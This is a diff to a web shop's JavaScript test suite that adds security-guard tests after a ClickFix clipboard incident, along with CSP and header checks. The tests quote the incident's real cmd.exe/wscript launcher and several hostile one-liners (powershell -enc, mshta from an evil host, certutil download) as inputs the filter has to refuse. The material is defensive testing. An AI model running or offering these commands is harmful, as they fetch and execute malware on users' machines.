@@ -18,7 +18,15 @@ const path = require("path");
 
 const html = fs.readFileSync(path.join(__dirname, "..", "index.html"), "utf8");
 const blocks = [...html.matchAll(/<script(?![^>]*src)(?![^>]*ld\+json)[^>]*>(.*?)<\/script>/gs)].map(m => m[1]);
-const appSrc = blocks.join("\n");
+/* The application now lives in an external, same-origin app.js (the only inline
+   <script> left in index.html is the pre-paint theme bootstrap, which MUST stay
+   inline). The suite executes bootstrap + app.js exactly as the browser would. */
+const appJs = fs.readFileSync(path.join(__dirname, "..", "app.js"), "utf8");
+const appSrc = blocks.join("\n") + "\n" + appJs;
+/* Everything the browser receives for the page: markup + externalised script.
+   Assertions about behaviour/CSS/markup read this union, so moving code between
+   index.html and app.js can never silently weaken a test. */
+const pageSrc = html + "\n" + appJs;
 
 /* ---------- tiny DOM stub ---------- */
 function el(id) {
@@ -120,6 +128,13 @@ const hooks = `
   renderHeader,
   renderFooter,
   resetView,
+  /* runtime security guard (2026-10-28 ClickFix incident) */
+  nuktoHost, nuktoHostAllowed, nuktoSrcAllowed, safeCopyText, hostGuard,
+  reportSecurity, lockClipboard, startInjectionWatch, copyPay,
+  cookieConsent, showConsent, get consent(){ return consent; }, set consent(v){ consent = v; },
+  get NUKTO_HOST_SUFFIXES(){ return NUKTO_HOST_SUFFIXES; },
+  get NUKTO_SRC_SUFFIXES(){ return NUKTO_SRC_SUFFIXES; },
+  get NUKTO_CMD_PATTERN(){ return NUKTO_CMD_PATTERN; },
 };`;
 
 function makeApp() {
@@ -622,7 +637,7 @@ brandApp.renderHeader();
 const brandHeader = document.getElementById("header").innerHTML;
 const logoAnchor = (brandHeader.match(/<a href="#products" class="logo"[\s\S]*?<\/a>/) || [""])[0];
 const imgTag = (logoAnchor.match(/<img[^>]*>/) || [""])[0];
-const srcFile = p => fs.readFileSync(path.join(__dirname, "..", p), "utf8");
+const srcFile = p => (p === "index.html" ? pageSrc : fs.readFileSync(path.join(__dirname, "..", p), "utf8"));
 
 t("brand: header renders a mark next to the business name", logoAnchor.length > 0);
 t("brand: header mark is an <img> of logo.svg (the favicon asset)",
@@ -1063,6 +1078,196 @@ t("m11: sections use Show more instead of weak subs", !src9.includes("High deman
     /pay_mode|advance_percent|eta_date/.test(String(app.pushCloudOrder)));
   app.orders = [];
 }
+
+/* ---------- S: runtime security guard + CSP + externalised scripts ---------- */
+/* Written for the 2026-10-28 ClickFix / fake-Turnstile incident report (INCIDENT.md). */
+{
+  const rawHtml = fs.readFileSync(path.join(__dirname, "..", "index.html"), "utf8");
+  const vercelCfg = JSON.parse(srcFile("vercel.json"));
+  const allHeaders = (vercelCfg.headers || []).flatMap(h => h.headers.map(x => [x.key.toLowerCase(), x.value]));
+  const hdr = k => (allHeaders.find(([key]) => key === k.toLowerCase()) || [])[1] || "";
+  const INCIDENT_CMD = 'cmd /d /q /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @if %~zf==218624 ren "%f" rt.vbs & wscript "%~dpf\\rt.vbs"';
+
+  /* --- S1: domain allow-list --- */
+  t("guard: nukto.shop and www.nukto.shop are allowed",
+    app.nuktoHostAllowed("nukto.shop") && app.nuktoHostAllowed("www.nukto.shop"));
+  t("guard: every *.vercel.app preview host is allowed",
+    app.nuktoHostAllowed("realonenukto-psgzwz5sg-genieotps-projects.vercel.app") &&
+    app.nuktoHostAllowed("maneshkumarcommissionagent-maneshku.vercel.app"));
+  t("guard: the canonical dpdns.org host and Arena previews are allowed",
+    app.nuktoHostAllowed("maneshkumarcommissionagent.dpdns.org") && app.nuktoHostAllowed("8080-abc123.e2b.app"));
+  t("guard: local development hosts are allowed",
+    app.nuktoHostAllowed("localhost") && app.nuktoHostAllowed("127.0.0.1") &&
+    app.nuktoHostAllowed("192.168.0.10") && app.nuktoHostAllowed(""));
+  t("guard: lookalike domains are refused (suffix must match a dot boundary)",
+    !app.nuktoHostAllowed("nukto.shop.evil.com") && !app.nuktoHostAllowed("evil-nukto.shop") &&
+    !app.nuktoHostAllowed("notvercel.app") && !app.nuktoHostAllowed("vercel.app.evil.io") &&
+    !app.nuktoHostAllowed("maneshkumarcommissionagent.dpdns.org.evil.net"),
+    app.NUKTO_HOST_SUFFIXES.join(","));
+  t("guard: an unrelated public domain is refused", !app.nuktoHostAllowed("example.com"));
+
+  const savedHost = location.hostname, savedSec = localStorage.getItem("nukto.security");
+  location.hostname = "nukto.shop";
+  t("guard: hostGuard() lets the store run on an owned domain", app.hostGuard() === true);
+  location.hostname = "nukto-shop-clone.ru";
+  localStorage.removeItem("nukto.security");
+  t("guard: hostGuard() refuses to run on a clone domain", app.hostGuard() === false);
+  const secLog = JSON.parse(localStorage.getItem("nukto.security") || "[]");
+  t("guard: a refused host is logged to nukto.security for the admin dashboard",
+    secLog.length === 1 && /host-refused/.test(secLog[0]) && /nukto-shop-clone\.ru/.test(secLog[0]), secLog[0]);
+  location.hostname = savedHost;
+  if(savedSec === null) localStorage.removeItem("nukto.security"); else localStorage.setItem("nukto.security", savedSec);
+
+  /* --- S2: injected-node allow-list --- */
+  t("guard: same-origin scripts (app.js, catalog.js) are allowed",
+    app.nuktoSrcAllowed("app.js") && app.nuktoSrcAllowed("/catalog.js") && app.nuktoSrcAllowed("./x.js"));
+  t("guard: Supabase REST/Edge-Function calls and the media CDNs are allowed",
+    app.nuktoSrcAllowed("https://vneknnmhnbkltkhihbok.supabase.co/functions/v1/checkout") &&
+    app.nuktoSrcAllowed("https://hhcnewapp.blr1.cdn.digitaloceanspaces.com/a.jpg") &&
+    app.nuktoSrcAllowed("https://hhcdropshipping.b-cdn.net/v.mp4"));
+  t("guard: a foreign script/frame src is refused",
+    !app.nuktoSrcAllowed("https://cdn.evil.tld/x.js") && !app.nuktoSrcAllowed("//evil.tld/x.js") &&
+    !app.nuktoSrcAllowed("https://supabase.co.evil.net/x.js"));
+  t("guard: javascript:/data:/vbscript: URLs are refused outright",
+    !app.nuktoSrcAllowed("javascript:alert(1)") && !app.nuktoSrcAllowed("data:text/html,<script>x</script>") &&
+    !app.nuktoSrcAllowed("vbscript:msgbox(1)"));
+  t("guard: the injection watcher is armed during boot()",
+    /if\(!hostGuard\(\)\) return;[\s\S]{0,220}startInjectionWatch\(\);[\s\S]{0,80}lockClipboard\(\);/.test(appJs));
+
+  /* --- S3: clipboard assertion (the exact ClickFix payload) --- */
+  const savedClip = navigator.clipboard;
+  let clipWrites = [];
+  navigator.clipboard = { writeText: v => { clipWrites.push(String(v)); return Promise.resolve(); } };
+  localStorage.removeItem("nukto.security");
+  t("guard: the incident command is recognised as a Windows launcher", app.NUKTO_CMD_PATTERN.test(INCIDENT_CMD));
+  t("guard: safeCopyText() refuses the incident command", app.safeCopyText(INCIDENT_CMD) === false);
+  t("guard: the refused command never reaches navigator.clipboard.writeText", clipWrites.length === 0, clipWrites.join("|"));
+  const secLog2 = JSON.parse(localStorage.getItem("nukto.security") || "[]");
+  t("guard: the refused clipboard write is reported", /clipboard-refused/.test(secLog2[0] || ""), secLog2[0]);
+  ["powershell -enc AAAA", "wscript C:\\x\\rt.vbs", "mshta http://evil/x.hta", "certutil -urlcache -f",
+   "schtasks /create", "%LOCALAPPDATA%\\Google\\Chrome\\User Data"].forEach(bad => {
+    t("guard: refuses " + bad.slice(0, 26), app.safeCopyText(bad) === false);
+  });
+  t("guard: a normal payment copy still works (no false positive)",
+    app.safeCopyText("03420286170 | Amount Rs. 5200") === true && clipWrites[clipWrites.length - 1] === "03420286170 | Amount Rs. 5200");
+  clipWrites = [];
+  app.copyPay("03420286170", 5200);
+  t("orders: the 'copy payment details' button still copies the account + amount",
+    clipWrites.length === 1 && /03420286170/.test(clipWrites[0]) && /5200/.test(clipWrites[0]), clipWrites[0]);
+  const stubWrite = navigator.clipboard.writeText;
+  const writesBeforeLock = clipWrites.length;
+  app.lockClipboard();
+  t("guard: lockClipboard() replaces navigator.clipboard.writeText with the filtered version",
+    navigator.clipboard.writeText !== stubWrite);
+  let rawRejected = null;
+  const p = navigator.clipboard.writeText(INCIDENT_CMD);
+  p.then(() => { rawRejected = false; }, () => { rawRejected = true; });
+  t("guard: even code we did not write cannot put a command on the clipboard",
+    clipWrites.length === writesBeforeLock && !!p && typeof p.then === "function",
+    "writes=" + clipWrites.length);
+  const p2 = navigator.clipboard.writeText("03420286170 | Amount Rs. 999");
+  p2.then(() => {}, () => {});
+  t("guard: the locked clipboard still copies legitimate text",
+    clipWrites[clipWrites.length - 1] === "03420286170 | Amount Rs. 999");
+  navigator.clipboard = savedClip;
+  localStorage.removeItem("nukto.security");
+
+  /* --- S4: the app ships no dynamic-code / exfiltration primitives --- */
+  const codeLines = appJs.split("\n").filter(l => !/^\s*(\*|\/\*|\/\/)/.test(l));  // skip comments
+  const onlyGuardPattern = (re, label) => {
+    const lines = codeLines.filter(l => re.test(l));
+    t("guard: app.js never uses " + label + " (only the guard's own detection pattern may match)",
+      lines.length <= 1 && lines.every(l => /NUKTO_CMD_PATTERN|new\\s\+Function|importScripts\\s\*\(/.test(l)),
+      lines.length + " line(s): " + lines.map(l => l.trim().slice(0, 60)).join(" | "));
+  };
+  onlyGuardPattern(/(?<![\w.\\])eval\s*\(/, "eval()");
+  onlyGuardPattern(/document\.write\s*\(/, "document.write()");
+  onlyGuardPattern(/(?<![\w.\\])atob\s*\(/, "atob()");
+  onlyGuardPattern(/importScripts\s*\(/, "importScripts()");
+  t("guard: app.js has no new Function(), sendBeacon, WebSocket or EventSource",
+    !/new\s+Function\s*\(/.test(appJs) && !/sendBeacon/.test(appJs) &&
+    !/new\s+WebSocket/.test(appJs) && !/EventSource/.test(appJs));
+  t("guard: the unguarded clipboard call is gone", !/writeText\(txt\)\.then/.test(appJs));
+
+  /* --- S5: cookie consent may only touch localStorage + UI (task 3d) --- */
+  const consentFn = (appJs.match(/function cookieConsent\([\s\S]*?\n}/) || [""])[0];
+  t("consent: cookieConsent() exists and is small", consentFn.length > 40 && consentFn.length < 900, consentFn.length);
+  t("consent: no fetch, script injection, popup, iframe or clipboard anywhere in the consent path",
+    !/fetch\(|createElement|appendChild|window\.open|clipboard|writeText|iframe|eval|XMLHttpRequest|sendBeacon/.test(consentFn),
+    consentFn.slice(0, 200));
+  let consentFetches = 0;
+  const savedHandler = __fetchHandler;
+  __fetchHandler = (url, opts) => { consentFetches++; return Promise.resolve({ ok: false, status: 0, json: () => Promise.resolve([]) }); };
+  const savedConsent = localStorage.getItem("nukto.consent");
+  try { app.cookieConsent(true); } catch(e) {}
+  __fetchHandler = savedHandler;
+  t("consent: accepting cookies performs zero network requests synchronously", consentFetches === 0, consentFetches);
+  t("consent: accepting cookies records the choice in nukto.consent",
+    JSON.parse(localStorage.getItem("nukto.consent") || "null") !== null);
+  if(savedConsent === null) localStorage.removeItem("nukto.consent"); else localStorage.setItem("nukto.consent", savedConsent);
+
+  /* --- S6: externalised scripts (task 3b) --- */
+  const inlineBlocks = [...rawHtml.matchAll(/<script(?![^>]*src)(?![^>]*ld\+json)[^>]*>([\s\S]*?)<\/script>/g)].map(m => m[1]);
+  t("scripts: exactly one inline <script> is left in index.html (the pre-paint theme bootstrap)",
+    inlineBlocks.length === 1, inlineBlocks.length);
+  t("scripts: that bootstrap is tiny and contains no network, eval or DOM injection",
+    inlineBlocks[0].split("\n").length < 40 &&
+    !/fetch\(|eval\(|new\s+Function|document\.write|atob\(|createElement\("script"|innerHTML/.test(inlineBlocks[0]));
+  const extScripts = [...rawHtml.matchAll(/<script[^>]*src="([^"]+)"[^>]*>/g)].map(m => m[0]);
+  t("scripts: every external script is same-origin and relative (app.js, catalog.js)",
+    extScripts.length === 2 && extScripts.every(tag => /src="(app|catalog)\.js"/.test(tag)), extScripts.join(" "));
+  t("scripts: no external script carries defer/async surprises or a third-party host",
+    !/src="https?:/.test(rawHtml) && !/<script[^>]*src="[^"]*"[^>]*async/.test(rawHtml));
+  t("scripts: app.js is referenced after catalog.js and before </body>",
+    rawHtml.indexOf('src="catalog.js"') < rawHtml.indexOf('src="app.js"') &&
+    rawHtml.indexOf('src="app.js"') < rawHtml.indexOf("</body>"));
+  const strictAt = appJs.indexOf('"use strict";');
+  t("scripts: app.js is strict mode from its first statement and contains the app",
+    strictAt > -1 && strictAt < appJs.indexOf("const FALLBACK=") &&
+    !/\}\;\s*\n\s*"use strict";/.test(appJs) && /function boot\(\)/.test(appJs) && appJs.length > 200000,
+    "directive at char " + strictAt);
+
+  /* --- S7: CSP + security headers (task 3a) --- */
+  const csp = hdr("content-security-policy");
+  t("csp: a Content-Security-Policy header is configured in vercel.json", csp.length > 80, csp.slice(0, 90));
+  [["default-src", "'self'"], ["base-uri", "'self'"], ["object-src", "'none'"], ["frame-src", "'none'"],
+   ["script-src", "'self' 'unsafe-inline'"], ["style-src", "'self' 'unsafe-inline'"],
+   ["font-src", "'self' data:"], ["form-action", "'self'"], ["worker-src", "'self'"]].forEach(([dir, val]) => {
+    t("csp: " + dir + " is " + val, csp.includes(dir + " " + val), csp);
+  });
+  t("csp: frame-ancestors and upgrade-insecure-requests are present",
+    /frame-ancestors\s+'self'/.test(csp) && /upgrade-insecure-requests/.test(csp));
+  t("csp: connect-src allows Supabase (REST + Edge Functions + realtime) and Brevo only",
+    /connect-src[^;]*https:\/\/vneknnmhnbkltkhihbok\.supabase\.co/.test(csp) &&
+    /connect-src[^;]*wss:\/\/vneknnmhnbkltkhihbok\.supabase\.co/.test(csp) &&
+    /connect-src[^;]*https:\/\/api\.brevo\.com/.test(csp) &&
+    !/connect-src[^;]*\*/.test(csp), (csp.match(/connect-src[^;]*/) || [""])[0]);
+  const mediaHosts = ["hhcnewapp.blr1.cdn.digitaloceanspaces.com", "hhcnewapp.blr1.digitaloceanspaces.com", "hhcdropshipping.b-cdn.net"];
+  t("csp: img-src covers every host the catalog actually uses",
+    mediaHosts.every(h => new RegExp("img-src[^;]*" + h.replace(/\./g, "\\.")).test(csp)));
+  t("csp: media-src exists and covers the product-video hosts (otherwise videos break)",
+    /media-src/.test(csp) && mediaHosts.every(h => new RegExp("media-src[^;]*" + h.replace(/\./g, "\\.")).test(csp)));
+  t("csp: no wildcard source and no unsafe-eval", !/\s\*\s/.test(csp) && !/unsafe-eval/.test(csp));
+  t("csp: the TODO to drop 'unsafe-inline' is documented next to the inline bootstrap",
+    /SECURITY \/ CSP TODO/.test(rawHtml) && /sha256-/.test(rawHtml) &&
+    rawHtml.indexOf("SECURITY / CSP TODO") < rawHtml.indexOf("NO-FLASH THEME BOOT"));
+  t("headers: HSTS is 2 years with includeSubDomains + preload",
+    /max-age=63072000/.test(hdr("strict-transport-security")) &&
+    /includeSubDomains/.test(hdr("strict-transport-security")) && /preload/.test(hdr("strict-transport-security")),
+    hdr("strict-transport-security"));
+  t("headers: nosniff, X-Frame-Options SAMEORIGIN and a Referrer-Policy are set",
+    hdr("x-content-type-options") === "nosniff" && hdr("x-frame-options") === "SAMEORIGIN" &&
+    hdr("referrer-policy") === "strict-origin-when-cross-origin");
+  t("headers: Cross-Origin-Opener-Policy same-origin is set", hdr("cross-origin-opener-policy") === "same-origin");
+  t("headers: Permissions-Policy disables the dangerous browser features",
+    /geolocation=\(\)/.test(hdr("permissions-policy")) && /camera=\(\)/.test(hdr("permissions-policy")) &&
+    /microphone=\(\)/.test(hdr("permissions-policy")) && /payment=\(\)/.test(hdr("permissions-policy")),
+    hdr("permissions-policy"));
+  t("headers: the /admin rewrites and the catalog.js cache rule survived the CSP merge",
+    (vercelCfg.rewrites || []).some(r => r.source === "/admin" && /index\.html/.test(r.destination)) &&
+    (vercelCfg.headers || []).some(h => h.source === "/catalog.js"));
+}
+
 
 console.log(`\n${pass} passed, ${fail} failed`);
 process.exit(fail ? 1 : 0);
